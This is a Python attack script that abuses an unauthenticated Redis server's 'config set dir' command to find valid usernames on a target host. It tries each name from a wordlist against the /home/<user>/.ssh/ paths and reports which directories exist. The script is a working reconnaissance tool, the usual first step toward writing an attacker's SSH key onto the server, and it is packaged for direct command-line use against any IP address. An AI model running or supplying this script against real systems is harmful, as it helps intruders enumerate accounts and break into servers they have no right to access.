#!/usr/bin/env python3
import subprocess
import os

def check_valid_username(ip_address, wordlist_path):
    # Ensure redis-cli is available
    if not any(os.path.isfile(path) for path in ['/usr/bin/redis-cli', '/usr/local/bin/redis-cli']):
        print("Error: redis-cli is not installed. Please install redis-cli and try again.")
        return

    # Attempt to open and read the wordlist
    try:
        with open(wordlist_path, 'r') as file:
            usernames = file.read().splitlines()
    except FileNotFoundError:
        print(f"Error: The wordlist file '{wordlist_path}' was not found.")
        return

    # Iterate through usernames and check for valid ones
    for username in usernames:
        cmd = f"redis-cli -h {ip_address} config set dir /home/{username}/.ssh/"
        result = subprocess.getoutput(cmd)
        if "No such file or directory" not in result:
            print(f"Valid username found: {username}")
            # Break after finding the first valid username, remove this if you want to find all
            break

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 3:
        print("Usage: python script.py <ip_address> <path_to_username_wordlist>")
        sys.exit(1)

    ip_address = sys.argv[1]
    wordlist_path = sys.argv[2]
    check_valid_username(ip_address, wordlist_path)
